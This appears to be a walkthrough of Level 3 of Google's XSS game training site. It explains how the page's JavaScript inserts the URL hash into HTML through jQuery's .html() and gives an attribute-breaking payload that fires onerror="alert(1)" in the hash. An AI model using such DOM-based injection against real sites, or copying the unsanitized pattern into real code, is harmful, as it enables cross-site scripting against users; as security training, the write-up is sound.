# [Level 3: That sinking feeling](https://xss-game.appspot.com/level3)

### **Observations**

* When the page loads, it displays an image with a number (Image 1, 2, or 3).
* The number is taken from the **URL fragment/hash** like:

  ```
  https://xss-game.appspot.com/level3/frame#1
  ```
* The JavaScript uses this part of the URL:

  ```js
  chooseTab(unescape(self.location.hash.substr(1)) || "1");
  ```
* Inside the `chooseTab()` function, it builds HTML like this:

  ```js
  html = "Image " + num + "<br>";
  html += "<img src='/static/level3/cloud" + num + ".jpg' />";
  $('#tabContent').html(html);
  ```
* That `num` comes **directly from the URL** and is inserted into the page using `innerHTML` via jQuery’s `.html()` — which is **unsafe** if the input isn’t sanitized.

### **What is DOM-Based XSS?**

DOM-Based XSS happens **entirely in the browser**, using **JavaScript on the page** that handles user input from places like the URL (`location.hash`, `location.search`, etc.) and inserts it into the DOM **without sanitizing** — allowing scripts to run.


### **Solution**

Use this payload in the URL hash:

```
https://xss-game.appspot.com/level3/frame#' onerror="alert(1)"
```

* Then The image tag becomes:

  ```html
  <img src='/static/level3/cloud' onerror="alert(1)".jpg' />
  ```
* The image fails to load (broken `src`), triggering `onerror`, which runs `alert(1)`.

**The problem is solved.**

